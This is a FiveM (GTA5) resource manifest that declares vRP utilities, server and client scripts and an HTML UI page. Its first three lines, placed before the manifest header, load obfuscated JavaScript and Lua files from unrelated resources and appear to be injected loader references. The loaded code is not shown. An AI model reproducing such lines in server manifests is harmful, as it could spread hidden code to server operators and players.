shared_script '@guerrarj-payment/ai_module_fg-obfuscated.js'
shared_script '@guerrarj-payment/ai_module_fg-obfuscated.lua'
shared_script '@faccaorj/shared_fg-obfuscated.lua'


fx_version 'adamant'
game 'gta5'

server_scripts {
  "@vrp/lib/utils.lua",
  'server.js',
  'server.lua'
}

client_scripts {
  'client.lua'
}

ui_page 'index.html'

files {
  'index.html'
}         